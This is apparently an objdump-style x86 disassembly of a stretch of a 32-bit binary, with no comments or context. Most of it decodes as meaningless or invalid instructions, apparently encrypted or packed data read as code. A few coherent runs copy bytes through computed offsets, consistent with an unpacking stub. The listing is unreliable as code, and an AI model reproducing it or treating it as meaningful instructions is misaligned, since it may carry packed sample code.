  40dac0:	ins    BYTE PTR es:[edi],dx
  40dac1:	mov    BYTE PTR [edx+0x2879e2e6],dh
  40dac7:	xchg   edi,eax
  40dac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dac9:	cs inc ebp
  40dacb:	fwait
  40dacc:	xchg   esp,eax
  40dacd:	lahf   
  40dace:	sbb    BYTE PTR [esi],bh
  40dad0:	fdivr  st(4),st
  40dad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dad3:	fist   WORD PTR [esi-0x9]
  40dad6:	jge    0x40da9a
  40dad8:	dec    eax
  40dad9:	lock cld 
  40dadb:	ins    BYTE PTR es:[edi],dx
  40dadc:	in     al,0xba
  40dade:	pop    esi
  40dadf:	(bad)  
  40dae0:	fmul   QWORD PTR [ebx+0x565579d4]
  40dae6:	cdq    
  40dae7:	call   0x7aa7a182
  40daec:	sub    eax,0x7595f161
  40daf1:	xchg   edi,eax
  40daf2:	cs (bad) 
  40daf4:	outs   dx,DWORD PTR ds:[esi]
  40daf5:	outs   dx,DWORD PTR ds:[esi]
  40daf6:	neg    DWORD PTR [edx]
  40daf8:	mov    bh,BYTE PTR [ebp-0x52]
  40dafb:	xchg   DWORD PTR [ecx+ecx*8+0x658ed8de],ecx
  40db02:	aaa    
  40db03:	pop    esp
  40db04:	das    
  40db05:	fnstcw WORD PTR [esi+ecx*4+0x3d61aa3c]
  40db0c:	xor    al,0xf1
  40db0e:	popf   
  40db0f:	jbe    0x40dafc
  40db11:	and    BYTE PTR [esi],bh
  40db13:	test   eax,0x191e3338
  40db18:	out    0xa2,al
  40db1a:	fs push eax
  40db1c:	push   0xb445fa86
  40db21:	push   ebx
  40db22:	mov    esi,0xee68c099
  40db27:	out    0x5b,al
  40db29:	out    0xee,eax
  40db2b:	je     0x40db84
  40db2d:	dec    ecx
  40db2e:	jmp    0x86b75ceb
  40db33:	push   ebp
  40db34:	or     cl,BYTE PTR [esi+eiz*8]
  40db37:	jge    0x40db24
  40db39:	aad    0x44
  40db3b:	or     ecx,DWORD PTR [esi]
  40db3d:	ins    BYTE PTR es:[edi],dx
  40db3e:	xor    ah,ah
  40db40:	retf   
  40db41:	cmovnp ebp,ecx
  40db44:	mov    eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db7c
  40db97:	inc    ebp
  40db98:	jno    0x40db4a
  40db9a:	pop    ebx
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [eax+0x7c2f6bad],dl
  40dba7:	or     esp,DWORD PTR [ecx+0x3641bd8]
  40dbad:	ins    BYTE PTR es:[edi],dx
  40dbae:	xor    edx,DWORD PTR [ebx+ebp*2+0x478b2d30]
  40dbb5:	clc    
  40dbb6:	mov    WORD PTR [ecx-0x29],cs
  40dbb9:	jae    0x40dbf2
  40dbbb:	or     al,0x8f
  40dbbd:	enter  0xf502,0x8d
  40dbc1:	adc    ah,BYTE PTR [esi-0x726fb9c4]
  40dbc7:	sahf   
  40dbc8:	stos   DWORD PTR es:[edi],eax
  40dbc9:	mov    bh,0x93
  40dbcb:	xchg   edx,eax
  40dbcc:	aam    0xa6
  40dbce:	cmp    esi,esp
  40dbd0:	cwde   
  40dbd1:	sub    al,0xf7
  40dbd3:	in     al,0x1b
  40dbd5:	sub    edx,ecx
  40dbd7:	ret    0xe6e1
  40dbda:	into   
  40dbdb:	ror    DWORD PTR [esi],cl
  40dbdd:	inc    ecx
  40dbde:	adc    DWORD PTR [ebx+ecx*8-0x16],edx
  40dbe2:	push   esp
  40dbe3:	cmp    esi,0xffffff9c
  40dbe6:	hlt    
  40dbe7:	out    dx,eax
  40dbe8:	stos   BYTE PTR es:[edi],al
  40dbe9:	dec    ebx
  40dbea:	dec    esp
  40dbeb:	hlt    
  40dbec:	push   0xffffffa1
  40dbee:	ret    
  40dbef:	xchg   ebp,eax
  40dbf0:	push   ebx
  40dbf1:	imul   eax,DWORD PTR [esi+0x6e],0xeb2d0b46
  40dbf8:	and    ah,BYTE PTR [edx+0x6e]
  40dbfb:	sbb    dl,BYTE PTR [ecx+0x6f]
  40dbfe:	in     al,dx
  40dbff:	das    
  40dc00:	into   
  40dc01:	adc    eax,0xf7aeed40
  40dc06:	in     eax,0x0
  40dc08:	push   esi
  40dc09:	mov    edx,0x272aa79c
  40dc0e:	xchg   ebp,eax
  40dc0f:	push   es
  40dc10:	int3   
  40dc11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc12:	adc    eax,0xb2992f7e
  40dc17:	test   al,0xff
  40dc19:	mov    ah,0xe8
  40dc1b:	pop    ds
  40dc1c:	xchg   esi,eax
  40dc1d:	sub    eax,0xf4d8809f
  40dc22:	push   es
  40dc23:	les    edi,FWORD PTR [ecx]
  40dc25:	mov    DWORD PTR [eax-0x12],edi
  40dc28:	push   esp
  40dc29:	in     al,0x50
  40dc2b:	xor    ebp,DWORD PTR [ebx+0x57]
  40dc2e:	and    BYTE PTR [eax-0x13],bl
  40dc31:	clc    
  40dc32:	es loopne 0x40dcae
  40dc35:	xor    eax,0x4348c321
  40dc3a:	bound  eax,QWORD PTR [ebp-0x24]
  40dc3d:	jl     0x40dbe6
  40dc3f:	jl     0x40dc14
  40dc41:	adc    eax,0xc1f3c4b0
  40dc46:	sbb    eax,0xc49f9ce0
  40dc4b:	xchg   BYTE PTR [ebx-0x16],al
  40dc4e:	xchg   edx,eax
  40dc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc50:	adc    DWORD PTR [ebx-0xe],esi
  40dc53:	hlt    
  40dc54:	xor    BYTE PTR [edx+0x71],ah
  40dc57:	into   
  40dc58:	pop    ecx
  40dc59:	push   cs
  40dc5a:	mov    esp,0xa20589a
  40dc5f:	aaa    
  40dc60:	clc    
  40dc61:	std    
  40dc62:	out    dx,al
  40dc63:	sbb    edx,esi
  40dc65:	jg     0x40dcb8
  40dc67:	pop    ebp
  40dc68:	aaa    
  40dc69:	aas    
  40dc6a:	retf   0x2614
  40dc6d:	les    ecx,FWORD PTR [si-0x370b]
  40dc72:	mov    eax,ds:0x84ea038e
  40dc77:	cmp    ebp,eax
  40dc79:	outs   dx,DWORD PTR ds:[esi]
  40dc7a:	or     al,0xb5
  40dc7c:	push   edx
  40dc7d:	pop    ss
  40dc7e:	inc    eax
  40dc7f:	jmp    0x40dc3c
  40dc81:	imul   eax,ebx,0x84df8e21
  40dc87:	xchg   BYTE PTR [eax],al
  40dc89:	xor    ch,bh
  40dc8b:	(bad)  
  40dc8c:	les    ecx,FWORD PTR [ebx-0x7a6aac7e]
  40dc92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc93:	fdiv   DWORD PTR [edi-0x6f]
  40dc96:	minps  xmm7,XMMWORD PTR [edi+edi*1]
  40dc9a:	retf   
  40dc9b:	loope  0x40dc52
  40dc9d:	scas   al,BYTE PTR es:[edi]
  40dc9e:	popf   
  40dc9f:	into   
  40dca0:	mov    al,ds:0x5ec75e30
  40dca5:	imul   edx,DWORD PTR [esi-0x1048ea2b],0x11d850d
  40dcaf:	ss and dl,ch
  40dcb2:	jno    0x40dc85
  40dcb4:	adc    eax,0x72d7fb58
  40dcb9:	or     DWORD PTR [edx-0x34],0x61
  40dcbd:	int    0xdd
  40dcbf:	inc    ecx
  40dcc0:	ins    BYTE PTR es:[edi],dx
  40dcc1:	iret   
  40dcc2:	push   cs
  40dcc3:	sub    edx,ebp
  40dcc5:	jne    0x40dc53
  40dcc7:	dec    ebp
  40dcc8:	into   
  40dcc9:	sbb    eax,0x3b0127d5
  40dcce:	jp     0x40dcdc
  40dcd0:	pushf  
  40dcd1:	ret    0xa5b5
  40dcd4:	test   BYTE PTR [ecx],ah
  40dcd6:	stos   DWORD PTR es:[edi],eax
  40dcd7:	sub    esi,DWORD PTR [ecx+0x2e]
  40dcda:	ror    DWORD PTR [edi+0x77c5fef5],0x4a
  40dce1:	pop    es
  40dce2:	dec    ebp
  40dce3:	adc    bl,ah
  40dce5:	ds cmc 
  40dce7:	sahf   
  40dce8:	and    edi,DWORD PTR [eax+0xe71cff3]
  40dcee:	cld    
  40dcef:	mov    ch,ah
  40dcf1:	mov    ds:0x9d356be,eax
  40dcf6:	and    edx,0x6b83f776
  40dcfc:	aad    0x99
  40dcfe:	lods   al,BYTE PTR ds:[esi]
  40dcff:	das    
  40dd00:	(bad)  
  40dd01:	retf   
  40dd02:	and    eax,0x428903
  40dd07:	and    edi,0xffffff84
  40dd0a:	setnp  BYTE PTR [ecx+eax*2]
  40dd0e:	add    al,0x1b
  40dd10:	outs   dx,DWORD PTR ds:[esi]
  40dd11:	hlt    
  40dd12:	mov    esi,0xeaea66e8
  40dd17:	fmul   QWORD PTR [esi+0x51]
  40dd1a:	xor    dl,BYTE PTR [ecx]
  40dd1c:	iret   
  40dd1d:	push   0xe56c599e
  40dd22:	mov    dl,0x10
  40dd24:	js     0x40dd64
  40dd26:	jl     0x40dd2f
  40dd28:	pop    ss
  40dd29:	mov    bl,BYTE PTR [esi+edx*2]
  40dd2c:	or     ebp,eax
  40dd2e:	aaa    
  40dd2f:	sti    
  40dd30:	jmp    0x40dd76
  40dd32:	test   dl,ah
  40dd34:	dec    edi
  40dd35:	scas   al,BYTE PTR es:[edi]
  40dd36:	aas    
  40dd37:	bound  ebx,QWORD PTR [edx-0x3c51bd76]
  40dd3d:	jnp    0x40dd4f
  40dd3f:	das    
  40dd40:	or     esp,edi
  40dd42:	data16 jl 0x40ddc4
  40dd45:	scas   eax,DWORD PTR es:[edi]
  40dd46:	push   ds
  40dd47:	shr    DWORD PTR [esi+0x3917bfa3],cl
  40dd4d:	jb     0x40dd02
  40dd4f:	pop    esi
  40dd50:	(bad)  
  40dd51:	into   
  40dd52:	mov    ebp,0x49c8e458
  40dd57:	sub    DWORD PTR [ebx-0x6c],ebp
  40dd5a:	(bad)  
  40dd5b:	es aas 
  40dd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd5e:	clc    
  40dd5f:	xor    BYTE PTR [ebp+0x0],bl
  40dd62:	mov    al,0x4c
  40dd64:	xor    eax,0xe7a4c8aa
  40dd69:	push   ebx
  40dd6a:	jb     0x40dd4e
  40dd6c:	gs mov bl,0xc3
  40dd6f:	inc    esi
  40dd70:	add    esi,eax
  40dd72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd73:	clc    
  40dd74:	xor    al,0x6
  40dd76:	shl    BYTE PTR [ebp+0x51],1
  40dd79:	aad    0x56
  40dd7b:	leave  
  40dd7c:	fnstsw WORD PTR [edx+0x4bb3dd1f]
  40dd82:	push   0xffffffa9
  40dd84:	iret   
  40dd85:	fst    st(1)
  40dd87:	imul   ecx,ebp,0x10
  40dd8a:	outs   dx,DWORD PTR ds:[esi]
  40dd8b:	push   cs
  40dd8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd8d:	pushf  
  40dd8e:	fist   DWORD PTR [edi+0x6a]
  40dd91:	icebp  
  40dd92:	dec    ebp
  40dd93:	and    al,ch
  40dd95:	outs   dx,DWORD PTR cs:[esi]
  40dd97:	push   edx
  40dd98:	inc    ebx
  40dd99:	call   0x66b9:0x80069ef3
  40dda0:	adc    ebp,DWORD PTR [ebx]
  40dda2:	loope  0x40dddd
  40dda4:	push   edx
  40dda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dda6:	push   0xd7d45afd
  40ddab:	inc    esp
  40ddac:	dec    ebx
  40ddad:	xor    ch,0xcb
  40ddb0:	cmp    BYTE PTR [esi+ebx*2],al
  40ddb3:	cmp    eax,DWORD PTR [ecx+0x4f59ada8]
  40ddb9:	or     dl,BYTE PTR [edx-0x18c6ace3]
  40ddbf:	jnp    0x40de06
  40ddc1:	ins    BYTE PTR es:[edi],dx
  40ddc2:	xlat   BYTE PTR ds:[ebx]
  40ddc3:	sysenter 
  40ddc5:	adc    al,BYTE PTR [edx]
  40ddc7:	or     ch,BYTE PTR [ebx+0x7a]
  40ddca:	int3   
  40ddcb:	mov    eax,ds:0xc195b226
  40ddd0:	out    dx,eax
  40ddd1:	sbb    al,0x1c
  40ddd3:	xchg   esp,eax
  40ddd4:	test   DWORD PTR [esi+0x15705c4d],esi
  40ddda:	ds dec edx
  40dddc:	push   0xbec2881e
  40dde1:	cmp    BYTE PTR [edi],0xb3
  40dde4:	hlt    
  40dde5:	and    BYTE PTR [edx+eiz*2-0x3438c66f],0xcd
  40dded:	data16 lods al,BYTE PTR ds:[esi]
  40ddef:	icebp  
  40ddf0:	mov    dl,0xa3
  40ddf2:	sub    ecx,DWORD PTR [edx-0x57]
  40ddf5:	inc    ebx
  40ddf6:	pop    es
  40ddf7:	popa   
  40ddf8:	pop    esi
  40ddf9:	jle    0x40de4f
  40ddfb:	out    dx,al
  40ddfc:	loope  0x40de31
  40ddfe:	mov    BYTE PTR [edx+edi*1-0x46],bl
  40de02:	mov    ch,0xa8
  40de04:	mov    ebp,0xfb1d54f9
  40de09:	sbb    ch,cl
  40de0b:	loopne 0x40de1d
  40de0d:	pop    ecx
  40de0e:	sbb    eax,0x761c4625
  40de13:	call   FWORD PTR [edi-0x47]
  40de16:	xchg   BYTE PTR [esi-0x17],ah
  40de19:	pop    ss
  40de1a:	jge    0x40ddf2
  40de1c:	out    0x12,al
  40de1e:	push   es
  40de1f:	popf   
  40de20:	outs   dx,DWORD PTR ds:[esi]
  40de21:	pop    edx
  40de22:	pop    edi
  40de23:	or     BYTE PTR [edi],0x91
  40de26:	aam    0x71
  40de28:	jne    0x40de8a
  40de2a:	sub    al,0x25
  40de2c:	dec    edi
  40de2d:	(bad)  
  40de2f:	scas   eax,DWORD PTR es:[edi]
  40de30:	cld    
  40de31:	add    edi,ebp
  40de33:	popa   
  40de34:	jg     0x40ddbb
  40de36:	push   ds
  40de37:	mov    DWORD PTR [ecx-0x3d],esi
  40de3a:	xchg   esi,eax
  40de3b:	mov    al,0x5a
  40de3d:	add    ch,dl
  40de3f:	retf   0x33ff
  40de42:	adc    BYTE PTR [eax+0x2b400007],ch
  40de48:	cmp    bh,al
  40de4a:	inc    ebp
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422598
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40df2f
  40deca:	lods   eax,DWORD PTR ds:[esi]
  40decb:	fnstcw WORD PTR [esp+edx*1-0x2de7e734]
  40ded2:	adc    al,0x18
  40ded4:	sbb    BYTE PTR [eax-0x2a1ef275],dl
  40deda:	hlt    
  40dedb:	push   0x53
  40dedd:	outs   dx,BYTE PTR ds:[esi]
  40dede:	mov    dh,0x0
  40dee0:	sub    DWORD PTR [eax+0xab39a08],0x9b14e7b6
  40deea:	out    0x83,al
  40deec:	pop    eax
  40deed:	je     0x40de6f
  40deef:	lea    ebx,[ebp-0x7d0297c6]
  40def5:	outs   dx,BYTE PTR ds:[esi]
  40def6:	(bad)  
  40def8:	push   ebx
  40def9:	lods   al,BYTE PTR ds:[esi]
  40defa:	rcr    DWORD PTR [ecx+0x6b],0x5
  40defe:	mov    edx,0xec2a3f43
  40df03:	cmp    BYTE PTR [eax+ebx*8-0x31ec121],bl
  40df0a:	lea    esi,ds:0xc84f4d80
  40df10:	mov    BYTE PTR [ebx],ch
  40df12:	mov    edx,DWORD PTR [edx]
  40df14:	dec    esp
  40df15:	pop    ebp
  40df16:	or     BYTE PTR [edx-0x2f1eaf5],ch
  40df1c:	cs repnz inc edi
  40df1f:	aas    
  40df20:	loop   0x40df8b
  40df22:	lahf   
  40df23:	push   edi
  40df24:	jmp    0xdd92:0x32b33923
  40df2b:	aaa    
  40df2c:	adc    DWORD PTR [ebx-0x6],eax
  40df2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df30:	sbb    DWORD PTR [esi],0xcad2796a
  40df36:	adc    eax,0xb4d682e6
  40df3b:	sti    
  40df3c:	sbb    ah,ah
  40df3e:	dec    edi
  40df3f:	jle    0x40df8a
  40df41:	mov    cl,0xfa
  40df43:	or     esi,ebx
  40df45:	fwait
  40df46:	daa    
  40df47:	ins    BYTE PTR es:[edi],dx
  40df48:	xor    al,0xb7
  40df4a:	and    DWORD PTR [ebx-0x301c7891],ecx
  40df50:	push   es
  40df51:	pop    edx
  40df52:	test   al,0xdf
  40df54:	idiv   BYTE PTR [eax]
  40df56:	adc    BYTE PTR [eax],bl
  40df58:	ror    BYTE PTR [ebp+eiz*1+0x5b],1
  40df5c:	out    dx,eax
  40df5d:	xchg   esi,eax
  40df5e:	int    0x5d
  40df60:	mov    esp,0x3ca4c1a0
  40df65:	pop    ebp
  40df66:	sub    eax,0x36b05a39
  40df6b:	cmp    ah,BYTE PTR [edi+eax*1]
  40df6e:	lea    ecx,[ebx-0x1ad647e2]
  40df74:	and    al,BYTE PTR [ecx+0x41]
  40df77:	mov    ecx,esi
  40df79:	xchg   ebp,eax
  40df7a:	pop    ds
  40df7b:	retf   0xdd38
  40df7e:	and    esi,DWORD PTR [esi+0x74]
  40df81:	dec    esp
  40df82:	paddq  mm0,mm4
  40df85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df86:	aad    0xbe
  40df88:	jb     0x40dff6
  40df8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df8b:	jg     0x40df41
  40df8d:	sbb    ah,BYTE PTR [ebx-0xa6672d7]
  40df93:	xor    DWORD PTR [esi+0x41],ebp
  40df96:	xor    DWORD PTR [ebx],edx
  40df98:	or     DWORD PTR [edx-0x4bfb434],ecx
  40df9e:	sub    eax,0x650cf6fd
  40dfa3:	ret    0x8681
  40dfa6:	and    ecx,DWORD PTR [ecx-0x701ade2e]
  40dfac:	jae    0x40e006
  40dfae:	jne    0x40dfa1
  40dfb0:	cli    
  40dfb1:	dec    eax
  40dfb2:	shr    ebp,0x81
  40dfb5:	les    ecx,FWORD PTR [ebx+0x5c]
  40dfb8:	cmp    al,0x97
  40dfba:	jp     0x40dfc9
  40dfbc:	fistp  QWORD PTR [esi]
  40dfbe:	or     eax,0x16d6aa5
  40dfc3:	add    eax,0xb7588c1f
  40dfc8:	mov    bh,0xa6
  40dfca:	jo     0x40e00f
  40dfcc:	sub    eax,0x4380fafd
  40dfd1:	xor    eax,0x64dea00
  40dfd6:	int3   
  40dfd7:	hlt    
  40dfd8:	(bad)  
  40dfd9:	(bad)  
  40dfda:	hlt    
  40dfdb:	pop    ebp
  40dfdc:	leave  
  40dfdd:	test   DWORD PTR [esi+0x65],ebp
  40dfe0:	out    0x4d,eax
  40dfe2:	mov    eax,ds:0x5920ca
  40dfe7:	(bad)
  40dfea:	call   0xbd6bb107
  40dfef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff0:	lds    si,DWORD PTR [ebx+0x3]
  40dff4:	push   0x903230d6
  40dff9:	fs dec esp
  40dffb:	push   cs
  40dffc:	popf   
  40dffd:	mov    ch,0x41
  40dfff:	add    al,0x60
  40e001:	sbb    eax,0xacedf0d9
  40e006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e007:	pop    ds
  40e008:	in     eax,dx
  40e009:	adc    BYTE PTR [ecx+0x2aee9a1a],0x1a
  40e010:	das    
  40e011:	in     eax,dx
  40e012:	mov    cl,0x81
  40e014:	imul   ecx,esi,0xffffffc0
  40e017:	xor    edx,eax
  40e019:	cdq    
  40e01a:	(bad)  [edi+0x77d01715]
  40e020:	mov    WORD PTR [ebx+0x1cba415d],cs
  40e026:	jne    0x40e005
  40e028:	pop    ebp
  40e029:	dec    esi
  40e02a:	dec    ebp
  40e02b:	cmp    edx,DWORD PTR [edi]
  40e02d:	shr    BYTE PTR [ebp+0x4c23bd39],1
  40e033:	mov    dh,0x7c
  40e035:	jmp    0x4f06dafa
  40e03a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e03b:	mov    esp,fs
  40e03d:	mov    ah,0x5
  40e03f:	aaa    
  40e040:	mov    al,0x3d
  40e042:	ret    0xd5b9
  40e045:	pop    eax
  40e046:	jbe    0x40e04e
  40e048:	loop   0x40e052
  40e04a:	push   ecx
  40e04b:	adc    al,0xc1
  40e04d:	xchg   edx,eax
  40e04e:	ds add al,0xe7
  40e051:	imul   eax,DWORD PTR [eax-0x23],0x62
  40e055:	call   0x1e30bee4
  40e05a:	call   0x4e44374b
  40e05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e060:	push   eax
  40e061:	pop    es
  40e062:	inc    eax
  40e063:	stc    
  40e064:	fldenv [ebx]
  40e066:	pop    edx
  40e067:	sub    edi,DWORD PTR [ebp-0x4b46218a]
  40e06d:	mov    esp,0x1adc0089
  40e072:	push   esp
  40e073:	xchg   edx,eax
  40e074:	loop   0x40e0bd
  40e076:	mov    eax,ds:0x87f71fe7
  40e07b:	ss push eax
  40e07d:	push   0xdd328497
  40e082:	out    dx,eax
  40e083:	xchg   ebx,eax
  40e084:	cs cwde 
  40e086:	les    esi,FWORD PTR [eax+eax*4]
  40e089:	imul   ebx,DWORD PTR [edx+0x3482f631],0xd4d01cf5
  40e093:	dec    edx
  40e094:	out    0x3a,eax
  40e096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e097:	pop    esi
  40e098:	and    BYTE PTR [ebx+edx*4+0x5d],cl
  40e09c:	div    DWORD PTR [ebx+0x11]
  40e09f:	leave  
  40e0a0:	jg     0x40e086
  40e0a2:	jmp    0x40e0e5
  40e0a4:	xchg   esp,eax
  40e0a5:	nop
  40e0a6:	arpl   WORD PTR [eax+ebx*1-0x4],bx
  40e0aa:	loope  0x40e031
  40e0ac:	retf   
  40e0ad:	sbb    ah,0xd9
  40e0b0:	mov    bh,BYTE PTR [eax-0x50]
  40e0b3:	test   DWORD PTR [ebx-0x15d55a3e],eax
  40e0b9:	sub    bl,BYTE PTR [ecx-0x5681160a]
  40e0bf:	out    dx,al
  40e0c0:	repnz pop edi
  40e0c2:	mov    ds:0xf9a50dad,eax
  40e0c7:	test   DWORD PTR [edi],edx
  40e0c9:	sbb    ecx,eax
  40e0cb:	cmp    eax,ebx
  40e0cd:	add    eax,0x83fbfc6d
  40e0d2:	cmp    ebp,DWORD PTR [edi+0x6036b572]
  40e0d8:	loop   0x40e073
  40e0da:	call   0xd0f5cb52
  40e0df:	pop    ebp
  40e0e0:	sub    BYTE PTR [edi-0x3],cl
  40e0e3:	sub    bh,BYTE PTR [esi]
  40e0e5:	cmp    DWORD PTR [ebx],esi
  40e0e7:	popf   
  40e0e8:	test   bh,al
  40e0ea:	scas   eax,DWORD PTR es:[edi]
  40e0eb:	inc    edx
  40e0ec:	push   ecx
  40e0ed:	test   BYTE PTR [ebx],bh
  40e0ef:	mov    edx,0xb659d9ac
  40e0f4:	dec    ebp
  40e0f5:	mov    eax,ds:0xd9178ea2
  40e0fa:	inc    ebp
  40e0fb:	sahf   
  40e0fc:	iret   
  40e0fd:	ins    BYTE PTR es:[edi],dx
  40e0fe:	inc    ebp
  40e0ff:	pop    ebx
  40e100:	mov    ah,0x4a
  40e102:	push   esi
  40e103:	stc    
  40e104:	and    DWORD PTR [edx-0x34],esp
  40e107:	mov    WORD PTR [ecx+edi*8+0x155dc003],es
  40e10e:	sub    ebx,ebx
  40e110:	(bad)  
  40e111:	push   ss
  40e112:	adc    DWORD PTR [ebp+0x1945bc11],ecx
  40e118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e119:	inc    DWORD PTR [esi+0x6af2c1fd]
  40e11f:	lea    esp,[ebx]
  40e121:	inc    edx
  40e122:	or     eax,0xfaa656e4
  40e127:	dec    esp
  40e128:	add    al,0xab
  40e12a:	push   esp
  40e12b:	(bad)  
  40e12c:	fldcw  WORD PTR [eax-0x4e]
  40e12f:	adc    eax,0x19f6ffba
  40e134:	call   0xc0d25d0b
  40e139:	fiadd  DWORD PTR [ecx-0x37]
  40e13c:	pop    ss
  40e13d:	sub    al,0x8
  40e13f:	leave  
  40e140:	dec    ebp
  40e141:	sub    DWORD PTR [edi-0x1d],0xeab8e093
  40e148:	adc    cl,BYTE PTR [edx+0x20]
  40e14b:	pop    eax
  40e14c:	pop    ebx
  40e14d:	retf   0xa49d
  40e150:	mov    dh,0x74
  40e152:	add    al,bh
  40e154:	sbb    ch,al
  40e156:	fdiv   QWORD PTR [ecx+0x5b919dc2]
  40e15c:	(bad)  
  40e15d:	fisubr WORD PTR [ebp+eiz*8-0x535931ce]
  40e164:	mov    eax,ds:0x3d48de53
  40e169:	fld    QWORD PTR [ebx+0x7d]
  40e16c:	dec    ebx
  40e16d:	jg     0x40e10f
  40e16f:	fdiv   DWORD PTR [ecx-0x39]
  40e172:	(bad)  
  40e173:	lea    eax,[ebp-0x12d68fe4]
  40e179:	xchg   esp,eax
  40e17a:	xchg   ebp,eax
  40e17b:	add    eax,0x35f0458b
  40e180:	into   
  40e181:	loope  0x40e182
  40e183:	inc    DWORD PTR [ebx]
  40e185:	inc    ebp
  40e186:	hlt    
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e18f
  40e199:	xchg   esp,eax
  40e19a:	sar    DWORD PTR [esi+ecx*8-0x2de7e738],cl
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [eax-0x13],cl
  40e1a6:	pop    es
  40e1a7:	loope  0x40e223
  40e1a9:	mov    edi,0x10f1c286
  40e1ae:	cdq    
  40e1af:	add    BYTE PTR gs:[edi+0x5c37d93c],dl
  40e1b6:	sub    DWORD PTR [ebp-0x1d],0x59
  40e1ba:	mov    fs,WORD PTR [edi]
  40e1bc:	cmp    edx,DWORD PTR [edi+ecx*4+0x6c6966be]
  40e1c3:	int    0x16
  40e1c5:	push   esi
  40e1c6:	xchg   esi,eax
  40e1c7:	sbb    DWORD PTR [eax],edi
  40e1c9:	cdq    
  40e1ca:	and    dh,BYTE PTR [edi-0x126c7c02]
  40e1d0:	pop    ss
  40e1d1:	pop    esi
  40e1d2:	addr16 xchg ebx,eax
  40e1d4:	xor    BYTE PTR [edi],0xdc
  40e1d7:	repz repnz cmp eax,0xf310a24b
  40e1de:	and    al,0xd1
  40e1e0:	jp     0x40e248
  40e1e2:	jecxz  0x40e1fd
  40e1e4:	xchg   ebx,eax
  40e1e5:	inc    ebx
  40e1e6:	stos   DWORD PTR es:[edi],eax
  40e1e7:	pop    ebp
  40e1e8:	jecxz  0x40e1b3
  40e1ea:	cmp    al,0xf5
  40e1ec:	and    BYTE PTR [ebx+0x43],0x4b
  40e1f0:	push   eax
  40e1f1:	jae    0x40e263
  40e1f3:	stos   DWORD PTR es:[edi],eax
  40e1f4:	mov    ch,BYTE PTR [eax]
  40e1f6:	dec    eax
  40e1f7:	in     al,dx
  40e1f8:	dec    ebx
  40e1f9:	xor    ah,dl
  40e1fb:	push   cs
  40e1fc:	jmp    0xa0ef843b
  40e201:	mov    WORD PTR [esi+0x74],es
  40e204:	push   esi
  40e205:	push   edx
  40e206:	inc    ebp
  40e207:	pushf  
